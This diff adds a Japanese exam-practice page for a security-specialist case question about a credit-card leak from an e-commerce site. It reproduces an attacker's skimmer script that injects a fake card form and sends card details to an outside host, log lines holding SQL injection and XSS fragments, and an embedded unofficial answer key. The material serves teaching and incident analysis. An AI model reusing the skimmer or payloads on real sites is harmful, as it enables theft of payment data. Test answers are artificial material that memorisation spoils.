@@ -1,0 +1,201 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>問3 クレジットカード情報の漏えい｜情報処理安全確保支援士 午後問題演習</title>
+<link rel="stylesheet" href="../assets/style.css">
+</head>
+<body>
+<div class="wrap">
+
+  <a class="backlink" href="index.html">← 問題一覧に戻る</a>
+  <h1>問3　クレジットカード情報の漏えい</h1>
+  <div class="meta">令和6年度 秋期 情報処理安全確保支援士試験 午後問題　問3／全6設問</div>
+
+  <div class="mondai">クレジットカード情報の漏えいに関する次の記述を読んで，設問に答えよ。
+
+　J社は，インテリアを扱うECサイト（以下，J社のECサイトをJ社ECサイトという）を運営する，従業員200名の会社である。
+
+〔J社ECサイトの構成〕
+　J社ECサイトは，Webアプリケーションプログラム（以下，J社ECサイトのWebアプリケーションプログラムをWebアプリPという），Webサーバ及びDBサーバで構成されている。J社はWebアプリPの開発及び保守，並びにWebサーバ及びDBサーバの構築，管理及び保守をV社に委託している。WebアプリPのアプリケーションログには，アクセス日時，画面名，アカウント名，アクセス元IPアドレスなどが記録される。
+　J社ECサイトでの支払方法は，クレジットカード決済及び銀行振込に対応している。
+　クレジットカード決済はD社の決済代行サービスを利用している。D社の提供する決済用ECMAScriptプログラムを使用したトークン型決済を用いて，クレジットカード情報の非保持化を実現している。商品購入に関する画面の概要を表1に，画面遷移を図1に示す。
+
+<table class="small-table" style="width:100%;">
+<tr><th>画面名</th><th>説明</th></tr>
+<tr><td>ショッピングカート</td><td>購入対象としてショッピングカートに登録された商品を表示する。ショッピングカートに登録した商品を購入する場合は，“購入”ボタンを押す。配送先・支払方法選択画面に遷移する。</td></tr>
+<tr><td>配送先・支払方法選択</td><td>配送先住所（注1）と支払方法を選択する。配送先住所を選択し，クレジットカード決済と銀行振込のいずれかの支払方法を選択して，“次へ”ボタンを押す。支払手続画面に遷移する。</td></tr>
+<tr><td>支払手続</td><td>支払方法に応じて，表示される内容及び入力する内容が異なる。クレジットカード決済の場合は，クレジットカード情報の入力フォームが表示される。D社の提供する決済用ECMAScriptプログラムによって，決済が行われる。銀行振込の場合は，振込先の口座情報が表示される。</td></tr>
+<tr><td>注文完了</td><td>ショッピングカート→配送先・支払方法選択→支払手続が完了した場合に表示される。この後に注文確認の電子メール（注2）が商品を購入した利用者に送信される。</td></tr>
+</table>
+表1　商品購入に関する画面の概要（抜粋）
+注1）利用者情報としてあらかじめ配送先住所を登録しておく。配送先住所は複数登録できる。登録済みの配送先住所はプルダウンで選択できる。
+注2）利用者情報としてあらかじめ電子メールアドレスを登録しておく。
+
+<div class="diag">/cart［ショッピングカート］ ご注文一覧（商品1 30,000円，商品2 7,500円，商品3 15,000円，合計52,500円）［戻る］［購入］
+   ↓［購入］
+/shopping［配送先・支払方法選択］ 配送先（プルダウン）／お支払方法（◉クレジットカード決済 ○銀行振込）［戻る］［次へ］
+   ↓［次へ］
+/payment［支払手続］ ご利用金額 52,500円／クレジットカード情報の入力（カード番号，有効期限 月/年，名義，セキュリティコード）［戻る］［注文］
+   ↓［注文］
+/confirm［注文完了］ ご注文ありがとうございました。ご注文確認の電子メールをお送りしたのでご確認ください。［トップへ］
+注記1　/cartなどはURLのパス名を示す。
+注記2　/cart以外へのアクセスはJ社ECサイトへのログインが必要である。
+注記3　/cart以外は直接アクセスするとトップページにリダイレクトされる。</div>
+図1　商品購入に関する画面遷移
+
+〔利用者からの問合せ〕
+　6月11日から12日にかけて，複数の利用者から，クレジットカード情報を入力する画面が2回表示されるという問合せ，及び支払方法が勝手にクレジットカード決済になってしまうという問合せがあった。J社EC サイト担当者のGさんは，偽のクレジットカード情報入力フォーム（以下，偽フォームという）が表示された可能性があると考え，上司のRさんに報告した上で，Webサーバの6月11日のアクセスログに不審な点がないかどうかを確認した。Webサーバの6月11日のアクセスログのうち，不審と思われるアクセスを抽出したものを表2に示す。
+
+<table class="small-table" style="width:100%;">
+<tr><th>行番号</th><th>メソッド</th><th>リクエストURI</th><th>ステータスコード</th></tr>
+<tr><td>1</td><td>GET</td><td>/products/list?page=4&amp;category_id=1</td><td>200</td></tr>
+<tr><td>2</td><td>GET</td><td>/login?id=hoge&amp;pw=' UNION select 1 FROM…</td><td>200</td></tr>
+<tr><td>3</td><td>POST</td><td>/mypage/userinfo</td><td>200</td></tr>
+<tr><td>4</td><td>POST</td><td>/mypage/change</td><td>200</td></tr>
+<tr><td>5</td><td>GET</td><td>/cart?add="&gt;&lt;script&gt;document.getElementById(…</td><td>200</td></tr>
+<tr><td>6</td><td>GET</td><td>/products/list?category=green's sofa</td><td>200</td></tr>
+<tr><td>7</td><td>PUT</td><td>/shopping</td><td>405</td></tr>
+<tr><td>8</td><td>GET</td><td>/cart</td><td>200</td></tr>
+<tr><td>9</td><td>POST</td><td>/payment</td><td>200</td></tr>
+<tr><td>10</td><td>PUT</td><td>/ec-j/layout/js/customize.js</td><td>204</td></tr>
+</table>
+表2　Webサーバのアクセスログ
+注記1　アクセス日時，User-Agent，リファラなどは省略している。
+注記2　リクエストURI中の“…”は省略を表す。
+注記3　リクエストURIは，URLデコード済みである。
+
+　次は，アクセスログに関するRさんとGさんの会話である。
+
+Rさん：偽フォームの表示が可能な攻撃の痕跡はあったのか。
+Gさん：表2の <span class="blank">a</span> 行目が <span class="blank">b</span> 脆弱性を狙った攻撃だと思いますが，そういった攻撃であれば偽フォームの表示が可能です。さらに <span class="blank">b</span> 脆弱性が <span class="blank">c</span> 型であれば，1回の攻撃で多数の利用者に対して偽フォームの表示が可能です。
+Rさん：それとは別に，表2の <span class="blank">d</span> 行目は <span class="blank">e</span> 脆弱性を狙った攻撃の痕跡だと思うが，仮にその脆弱性が存在した場合に，偽フォームの表示は可能なのか。
+Gさん：WebアプリPが，DBサーバに格納している情報を基にWebページを動的に生成していれば可能かもしれません。
+Rさん：承知した。その他，表2の10行目のPUTメソッドでファイルが更新されている点も気になる。以前，セキュリティベンダーに依頼して報告を受けているWebアプリPの脆弱性診断レポートに，<span class="blank">b</span> 脆弱性及び <span class="blank">e</span> 脆弱性の指摘があるかどうかと，PUTメソッドによる更新はV社によるものかどうかを，V社に至急確認してほしい。
+
+　Gさんは，6月13日にV社に問い合わせた。また，最新バージョンのWebアプリPに対する脆弱性診断レポートを確認したところ，脆弱性の指摘はなかった。
+
+〔偽フォーム表示の原因の調査と対策〕
+　6月14日にV社から連絡があり，PUTメソッドによるファイル更新はV社によるものではなかったことが判明した。Webサーバに設置していたECMAScriptファイルの一つcustomize.jsが攻撃者のファイル（以下，ファイルKという）に置き換えられていた。customize.jsは，通常時は空のファイルであり，Webサイトのデザインを一時的に変更する際に利用するものである。<u>①配送先・支払方法選択画面でファイルKが読み込まれており，HTMLの一部が書き換えられていた</u>。この書換えによって，<u>②配送先・支払方法選択画面から支払手続画面への画面遷移の処理で利用しているパラメータの値が変更され，支払方法がクレジットカード決済に固定されていた</u>。ファイルKを整形したものを図2に，配送先・支払方法選択画面のHTMLソースを図3に示す。
+
+<div class="fbox code">  1: if (location.pathname == '/shopping'){
+  2:   let elem = document.querySelector("#shopping-form &gt; div &gt; div &gt; div.order_payment &gt; div.radio");
+  3:   elem.innerHTML='&lt;p&gt;カード番号&lt;input type="text" id="get_number" /&gt;&lt;/p&gt;&lt;p&gt;有効期限&lt;input type="text" id="get_exp_month" /&gt;月/&lt;input type="text" id="get_exp_year" /&gt;年&lt;/p&gt;&lt;p&gt;名義&lt;input type="text" id="get_name" /&gt;&lt;/p&gt;&lt;p&gt;セキュリティコード&lt;input type="text" id="get_code" /&gt;&lt;/p&gt;&lt;input type="hidden" name="order[Payment]" value="1" /&gt;';
+  4:   let form = document.getElementById('shopping-form');
+  5:   form.addEventListener('submit', function() {
+  6:     const req = new XMLHttpRequest();
+  7:     let number = document.getElementById('get_number').value;
+  8:     let exp_month = document.getElementById('get_exp_month').value;
+  9:     let exp_year = document.getElementById('get_exp_year').value;
+ 10:     let name = document.getElementById('get_name').value;
+ 11:     let code = document.getElementById('get_code').value;
+ 12:     let url = 'https://i-sha.com/?num=' + number + '&amp;exp=' + exp_month + '%2F' + exp_year + '&amp;name=' + name + '&amp;code=' + code;
+ 13:     req.open("GET", url);
+ 14:     req.send();
+ 15:   });
+ 16: }</div>
+図2　整形後のファイルK
+
+<div class="fbox code">（省略）
+&lt;form id="shopping-form" method="post" action="/payment"&gt;
+&lt;div class="order"&gt;
+&lt;div class="order_detail"&gt;
+ （省略）
+&lt;div class="order_payment"&gt;
+&lt;div&gt;&lt;h2&gt;お支払方法&lt;/h2&gt;&lt;/div&gt;
+&lt;div class="radio"&gt;
+&lt;input type="radio" id="Payment_1" name="order[Payment]" required data-trigger="change" value="1" checked /&gt;
+&lt;label for="Payment_1"&gt;&lt;span&gt;クレジットカード決済&lt;/span&gt;&lt;/label&gt;
+&lt;input type="radio" id="Payment_2" name="order[Payment]" required data-trigger="change" value="2" /&gt;
+&lt;label for="Payment_2"&gt;&lt;span&gt;銀行振込&lt;/span&gt;&lt;/label&gt;
+&lt;/div&gt;
+ （省略）
+&lt;button type="submit" class="blockBtn"&gt;次へ&lt;/button&gt;
+&lt;/form&gt;
+ （省略）
+    &lt;script src="/ec-j/layout/js/customize.js"&gt;&lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+注記　CSRF対策のトークンの記述は省略している。</div>
+図3　配送先・支払方法選択画面のHTMLソース
+
+　その後，6月16日にV社から，customize.jsの置換えについての調査結果及び対処の報告があった。その報告を図4に示す。
+
+<div class="fbox">・V社でPUTメソッドに関する設定変更を6月8日18時12分に実施した。
+　Webサーバのファイル更新は，事前申請をした後にWebサーバにSSHで接続して行う運用であるが，V社の作業者がSSHで接続せずにファイルを更新できるように，/ec-j/layout/js/配下だけ，未認証でもPUTメソッドでファイルの更新を許可する設定にした。
+・V社で6月9日9時00分から10時42分の間にJ社ECサイトのメンテナンスを実施した。メンテナンスではPUTメソッドを使用した。
+・customize.jsの置換えは6月11日13時12分に行われた。
+　PUTメソッドを使って，ファイルKに置き換えられた。
+　WebアプリPの仕様上，customize.jsの読み込みは無効にできない。
+　customize.js以外のファイルの置換えはなかった。
+・6月16日8時5分にPUTメソッドによるファイルの更新を禁止する設定にし，customize.jsを置換え前のファイルに戻した。
+・6月16日9時00分にCache Bustingを実施した。
+　ファイルKのキャッシュ破棄とcustomize.jsの再読込みの二つを行わせるための変更をした。</div>
+図4　V社からの調査結果及び対処の報告
+
+〔クレジットカード情報の漏えいの調査と対策〕
+　本件に関する利用者からの問合せは，6月15日21時45分が最後であり，合計32件あった。次は，customize.jsの置換えによる影響の調査に関するRさんとGさんの会話である。
+
+Rさん：クレジットカード情報入力フォームが2回表示されたのは，customize.jsが置き換えられていた影響で偽フォームが表示されたからだったのか。
+Gさん：そのとおりです。2回目に表示されたクレジットカード情報入力フォームにクレジットカード情報を入力し，送信している場合だけ，当社で注文が完了していました。
+Rさん：ダミーのクレジットカード情報を設定して図2でGETリクエストが送られる先のURLにアクセスしたところ，404のステータスコードが返ってきた。もし，攻撃者のWebサーバが適切なステータスコードを返しているとしたら，この結果から，攻撃者のWebサーバにWebアプリケーションプログラムが用意されておらず，クレジットカード情報は盗まれていないと判断してよいか。
+Gさん：<u>③利用者が改ざんされた画面に入力して，クレジットカード情報が送信されてしまったときに，攻撃者のWebサーバでWebアプリケーションプログラムを用意していなくても，攻撃者は利用者の入力したクレジットカード情報を取得する方法があります</u>。クレジットカード情報は盗まれたと判断すべきです。
+Rさん：クレジットカード情報の漏えいの可能性について利用者に案内を出したい。攻撃者のWebサーバにクレジットカード情報を送信した利用者を特定してほしい。攻撃者のWebサーバに情報を送信してしまった利用者は漏れなく特定したいが，送信していない利用者はできるだけ含めたくない。そのためには，どのようにすればよいのか。
+Gさん：V社の報告から，customize.jsの置換えの影響のあった期間は6月11日13時12分から6月16日9時00分と考えられます。攻撃者のWebサーバにクレジットカード情報を送信する直前までの操作をした利用者を被害者候補として特定するために，その期間のアプリケーションログから <span class="blank">f</span> を抽出したいと思います。
+Rさん：それで抽出してくれ。
+
+　その後，Gさんは，プロキシサーバなどのキャッシュの影響も考慮した上で，被害者候補を特定し，その情報を基に案内を出した。また，J社は，関係当局に報告，届出を行うとともに，V社と協力して再発防止策を検討し，実施した。さらに，Webサーバのファイルの改ざん検知の検討を行うことにした。</div>
+
+  <div class="meta" style="margin-top:-14px;">💡 本文中の気になる箇所をドラッグで選択すると，マーカーの色を選べます（引いたマーカーはクリックで消去できます）。</div>
+
+  <!-- ========== 設問1 ========== -->
+  <h2 class="setumon">設問1　本文中のa～eに入れる適切な行番号又は字句を答えよ。</h2>
+  <div class="qa-item" data-points="25">
+    <div class="field-row" data-label="a" data-answer="5" data-alt="5行目"><textarea maxlength="5" placeholder="a"></textarea><span class="charcount">0/5</span></div>
+    <div class="field-row" data-label="b" data-answer="クロスサイトスクリプティング" data-alt="XSS"><textarea maxlength="15" placeholder="b"></textarea><span class="charcount">0/15</span></div>
+    <div class="field-row" data-label="c" data-answer="格納" data-alt="持続|蓄積|Stored"><textarea maxlength="6" placeholder="c"></textarea><span class="charcount">0/6</span></div>
+    <div class="field-row" data-label="d" data-answer="2，6" data-alt="2,6|2と6|6，2|6,2"><textarea maxlength="6" placeholder="d"></textarea><span class="charcount">0/6</span></div>
+    <div class="field-row" data-label="e" data-answer="SQLインジェクション" data-alt="SQLi"><textarea maxlength="15" placeholder="e"></textarea><span class="charcount">0/15</span></div>
+  </div>
+
+  <!-- ========== 設問2 ========== -->
+  <h2 class="setumon">設問2　〔偽フォーム表示の原因の調査と対策〕について答えよ。</h2>
+  <div class="qa-item" data-points="12">
+    <div class="q-text">(1) 本文中の下線①について，書換え後の画面全体を図示せよ。（ここでは画面の構成を文章で答える。）</div>
+    <div class="field-row" data-label="" data-answer="配送先のプルダウンと“お支払方法”の見出しの下に，カード番号，有効期限（月/年），名義，セキュリティコードの入力欄が並び，ラジオボタンはなく，戻る・次へボタンがある画面。" data-alt=""><textarea maxlength="99" placeholder="画面の構成を文章で"></textarea><span class="charcount">0/99</span></div>
+  </div>
+  <div class="qa-item" data-points="10">
+    <div class="q-text">(2) 本文中の下線②について，パラメータ名とその値を答えよ。</div>
+    <div class="field-row" data-label="パラメータ名" data-answer="order[Payment]" data-alt=""><textarea maxlength="15" placeholder="パラメータ名"></textarea><span class="charcount">0/15</span></div>
+    <div class="field-row" data-label="値" data-answer="1" data-alt=""><textarea maxlength="3" placeholder="値"></textarea><span class="charcount">0/3</span></div>
+  </div>
+  <div class="qa-item" data-points="15">
+    <div class="q-text">(3) 図2について，4～15行目の処理内容を具体的に答えよ。</div>
+    <div class="field-row" data-label="" data-answer="次へボタンでフォームを送信するときに，入力されたカード番号，有効期限，名義，セキュリティコードを取得し，GETリクエストのクエリとして攻撃者のサイトi-sha.comに送信する。" data-alt=""><textarea maxlength="90" placeholder="90字程度"></textarea><span class="charcount">0/90</span></div>
+  </div>
+
+  <!-- ========== 設問3 ========== -->
+  <h2 class="setumon">設問3　〔クレジットカード情報の漏えいの調査と対策〕について答えよ。</h2>
+  <div class="qa-item" data-points="18">
+    <div class="q-text">(1) 本文中の下線③について，攻撃者のWebサーバでクレジットカード情報を取得する方法を答えよ。</div>
+    <div class="field-row" data-label="" data-answer="攻撃者のWebサーバのアクセスログに記録されたGETリクエストのURLのクエリ文字列から取得する。" data-alt="Webサーバのアクセスログを見る。"><textarea maxlength="50" placeholder="50字程度"></textarea><span class="charcount">0/50</span></div>
+  </div>
+  <div class="qa-item" data-points="20">
+    <div class="q-text">(2) 本文中の f に入れる適切な字句を答えよ。</div>
+    <div class="field-row" data-label="" data-answer="配送先・支払方法選択画面から支払手続画面に遷移したアクセスのアカウント名" data-alt="支払手続画面へのアクセスのアカウント名|/paymentへのアクセスログのアカウント名"><textarea maxlength="45" placeholder="45字程度"></textarea><span class="charcount">0/45</span></div>
+  </div>
+
+  <button id="gradeBtn">採点する</button>
+  <div id="scoreSummary"></div>
+
+  <div class="note">
+    ※ 図・表は本文中に直接埋め込んでいます（画像ファイルは使用していません）。ネットワーク構成図などは文字による簡易表現です。<br>
+    ※ <b>模範解答はIPA公式の解答例ではなく，問題文から作成した参考解答です。</b>採点後は，IPAが公表している解答例・採点講評と見比べてください。<br>
+    ※ 採点はすべてブラウザ内（クライアントサイドJS）で完結しており，サーバ通信は行いません。
+  </div>
+
+</div>
+<script src="../assets/engine.js"></script>
+</body>
+</html>
